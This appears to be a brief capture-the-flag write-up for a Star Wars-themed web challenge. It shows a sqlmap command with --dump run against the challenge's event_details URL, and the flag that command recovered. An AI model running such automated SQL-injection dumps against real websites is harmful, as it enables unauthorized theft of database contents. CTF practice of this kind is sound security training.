# Undercover Orientation Day

> Hello Rebel, we have a special mission for you. We need you to go undercover as a Storm Trooper for their first day on the job. We have intel that suggests the Orientation Website has a vulnerability in it that will potentially leak important information. Can you find the secret plans?
> 
> Link

For this one, I noticed that the listed URLs included a variable, so I just threw it into SQLMap

```
$ sqlmap -u 'https://challenges.silicon-ctf.party/web300/event_details?event=Meet%20and%20Greet' --dump
...
silicon{Once_This_Group_Of_Stormtroopers_Is_Trained_we_target_Hoth}
...
```